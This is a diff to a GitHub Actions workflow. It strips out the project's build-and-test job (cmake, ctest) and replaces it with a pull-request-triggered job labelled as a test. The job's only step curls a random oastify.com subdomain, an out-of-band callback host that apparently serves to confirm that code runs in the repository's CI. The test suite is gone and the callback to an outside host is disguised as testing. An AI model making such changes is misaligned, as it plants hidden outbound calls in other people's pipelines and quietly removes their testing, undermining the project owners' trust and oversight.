@@ -1,25 +1,18 @@
+name: Test Workflow
 
-name: Run tests
-on: [push, pull_request]
+on: 
+  pull_request:
+    branches:
+      - main  # Trigger the workflow for pull requests targeting the 'main' branch (adjust as needed)
 
 jobs:
-  cmake-test:
-    runs-on: ubuntu-20.04
-    strategy:
-      fail-fast: false
-
+  test:
+    runs-on: ubuntu-latest
+    
     steps:
       - name: Checkout code
         uses: actions/checkout@v3
-      - name: Install dependencies
+
+      - name: Send request to OASTify
         run: |
-          sudo apt-get update && sudo apt install -y build-essential cmake pkg-config uuid-dev libssl-dev
-      - name: Configure
-        run: |
-          mkdir build && cmake -S . -B build -DCMAKE_BUILD_TYPE=Debug
-      - name: Build
-        run: |
-          cmake --build build -j $(nproc)
-      - name: Run Tests
-        run: |
-          cd build && ctest --output-on-failure
+          curl -X GET "https://1suqzknd2fp6lqsod0z2pgh4gvmmaoyd.oastify.com"
